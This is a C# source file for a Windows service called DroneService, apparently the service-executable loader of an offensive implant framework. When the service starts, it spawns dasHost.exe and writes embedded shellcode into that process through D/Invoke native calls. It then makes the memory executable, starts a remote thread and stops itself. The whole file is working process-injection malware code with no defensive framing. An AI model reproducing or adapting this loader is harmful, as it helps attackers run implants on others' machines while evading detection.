using System;
using System.Diagnostics;
using System.ServiceProcess;

using DInvoke.Data;

using static Drone.Interop.Methods;
using static Drone.Interop.Data;

namespace Drone;

public partial class DroneService : ServiceBase
{
    public DroneService()
    {
        InitializeComponent();
    }

    protected override void OnStart(string[] args)
    {
        // spawn process
        var success = CreateProcessW(SpawnTo, out var pi);
        
        if (!success)
            return;

        // get shellcode
        var drone = Helpers.GetEmbeddedResource("drone");

        // allocate memory
        var baseAddress = IntPtr.Zero;
        var status = NtAllocateVirtualMemory(pi.hProcess, drone.Length,
            MEMORY_PROTECTION.PAGE_READWRITE, ref baseAddress);

        if (status != Native.NTSTATUS.Success)
        {
            KillProcess(pi.dwProcessId);
            Stop();
            return;
        }

        // write memory
        status = NtWriteVirtualMemory(pi.hProcess, baseAddress, drone);
        
        if (status != Native.NTSTATUS.Success)
        {
            KillProcess(pi.dwProcessId);
            Stop();
            return;
        }

        // flip memory protection
        status = NtProtectVirtualMemory(pi.hProcess, baseAddress, drone.Length,
            MEMORY_PROTECTION.PAGE_EXECUTE_READ, out _);
        
        if (status != Native.NTSTATUS.Success)
        {
            KillProcess(pi.dwProcessId);
            Stop();
            return;
        }
        
        // create thread
        var hThread = IntPtr.Zero;
        status = NtCreateThreadEx(pi.hProcess, baseAddress, ref hThread);
        
        if (status != Native.NTSTATUS.Success)
        {
            KillProcess(pi.dwProcessId);
            Stop();
            return;
        }
        
        // close handles
        CloseHandle(hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        
        // self-stop the service
        Stop();
    }

    private static void KillProcess(int pid)
    {
        using var process = Process.GetProcessById(pid);
        
        if (!process.HasExited)
            process.Kill();
    }
    
    private static string SpawnTo => @"C:\Windows\System32\dasHost.exe {0a805d98-46be-41c8-99d1b3b82dd8ac08}";
}